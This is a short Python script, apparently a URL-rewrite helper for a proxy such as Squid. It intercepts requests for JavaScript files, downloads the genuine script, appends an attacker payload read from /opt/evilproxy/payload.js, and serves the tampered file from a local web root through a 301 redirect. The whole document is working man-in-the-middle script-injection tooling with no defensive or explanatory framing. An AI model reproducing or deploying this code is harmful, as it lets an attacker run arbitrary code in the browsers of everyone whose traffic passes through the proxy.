#!/usr/bin/python3.7
import re
import sys
import os
import urllib.request as httpClient
import subprocess
counter = 0
def jsDownloader(url):
    remoteFile = httpClient.urlopen(url,None)
    reponse_content = remoteFile.read()
    file_name = str(counter)+str(os.getpid())
    with open(f"/var/www/html/{file_name}.js", 'a') as local_js_file:
      local_js_file.write(reponse_content.decode('UTF-8'))
      subprocess.call(['chmod','777', f"/var/www/html/{file_name}.js"])
      with open("/opt/evilproxy/payload.js",'r') as eviljs:
        whole_eviljs = eviljs.read()
        local_js_file.write(whole_eviljs)
        eviljs.close()
        local_js_file.close()
    return True

def main():
  global counter
  jsRegex = re.compile("(.*\.js)$")
  request = sys.stdin.readline()
  while request:
    if(request):
      [url, ip, separator, status, myip, myport] = request.split()
      if (jsRegex.search(url)):
        jsDownloader(url)
        sys.stdout.write(f'OK status=301 rewrite-url="http://x.x.x.x/{counter}{str(os.getpid())}.js" \n')
        sys.stdout.flush()
        counter += 1

      else:
        sys.stdout.write(f"OK\n")
        sys.stdout.flush()

    request = sys.stdin.readline()

if(__name__ == '__main__'):
  main()